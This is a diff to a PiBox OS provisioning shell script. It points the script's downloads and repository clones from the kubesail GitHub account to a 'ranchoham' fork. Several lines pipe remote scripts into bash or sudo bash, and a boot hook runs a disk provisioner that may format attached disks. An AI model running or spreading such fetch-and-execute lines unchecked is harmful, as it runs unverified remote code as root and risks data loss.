@@ -68,7 +68,7 @@ public=no
 EOF
 
 mkdir -p /opt/kubesail
-curl -sLo /opt/kubesail/update-framebuffer.sh https://raw.githubusercontent.com/kubesail/pibox-os/main/update-framebuffer.sh
+curl -sLo /opt/kubesail/update-framebuffer.sh https://raw.githubusercontent.com/ranchoham/pibox-os/main/update-framebuffer.sh
 chmod +x /opt/kubesail/update-framebuffer.sh
 /opt/kubesail/update-framebuffer.sh
 
@@ -85,7 +85,7 @@ echo "tmpfs /var/tmp tmpfs defaults,noatime,nosuid,nodev,noexec,mode=0755,size=6
 
 # Clone PiBox OS repo for building fan/display drivers
 rm -rf pibox-os
-git clone https://github.com/kubesail/pibox-os.git
+git clone https://github.com/ranchoham/pibox-os.git
 pushd pibox-os
 echo "PIBOX_RELEASE=$(git rev-parse --short HEAD)" > /etc/pibox-release
 popd
@@ -138,7 +138,7 @@ rm -rf linux-arm64 helm.tar.gz
 
 # Pibox Disk Provisioner - Note, this script will potentially format attached disks. Careful!
 mkdir -p /opt/kubesail/
-curl -sLo /opt/kubesail/provision-disk.sh https://raw.githubusercontent.com/kubesail/pibox-os/main/provision-disk.sh
+curl -sLo /opt/kubesail/provision-disk.sh https://raw.githubusercontent.com/ranchoham/pibox-os/main/provision-disk.sh
 chmod +x /opt/kubesail/provision-disk.sh
 # /opt/kubesail/provision-disk.sh
 # Run disk provisioner before K3s starts
@@ -147,12 +147,12 @@ echo -e "[Service]\nExecStartPre=/opt/kubesail/provision-disk.sh" > /etc/systemd
 systemctl daemon-reload
 
 # Install KubeSail helper services
-curl -s https://raw.githubusercontent.com/kubesail/pibox-os/main/setup.sh | bash
+curl -s https://raw.githubusercontent.com/ranchoham/pibox-os/main/setup.sh | bash
 
 # Install pibox-help script
 cat <<EOF > /usr/local/bin/pibox-help
 #!/bin/bash
-curl -sL https://raw.githubusercontent.com/kubesail/pibox-os/main/kubesail-support.sh | sudo bash
+curl -sL https://raw.githubusercontent.com/ranchoham/pibox-os/main/kubesail-support.sh | sudo bash
 EOF
 chmod +x /usr/local/bin/pibox-help
 
